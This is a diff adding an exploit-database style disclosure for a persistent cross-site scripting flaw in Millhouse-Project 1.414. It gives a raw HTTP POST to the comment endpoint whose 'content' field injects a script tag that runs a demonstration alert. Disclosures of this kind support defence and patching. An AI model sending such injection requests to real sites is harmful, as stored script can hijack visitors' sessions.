@@ -1,0 +1,26 @@
+# Exploit Title: thrsrossi Millhouse-Project 1.414 - 'content' Persistent Cross-Site Scripting
+# Date: 2019-11-01
+# Exploit Author: Cakes
+# Vendor Homepage: https://github.com/thrsrossi/Millhouse-Project
+# Software Link: https://github.com/thrsrossi/Millhouse-Project.git
+# Version: 1.414
+# Tested on: CentOS 7
+# CVE: N/A
+
+# PoC for this XSS attack
+
+POST /includes/add_comment_sql.php HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://TARGET/views/single_post.php?post_id=53
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 59
+Cookie: PHPSESSID=0sqr9kui308rq66ol1uu5olb94; submenu1=block; showips=10; showurls=10; showreferers=10
+Connection: close
+Upgrade-Insecure-Requests: 1
+DNT: 1
+
+content=%3Cscript%3Ealert%28%22TEST%22%29%3B%3C%2Fscript%3E
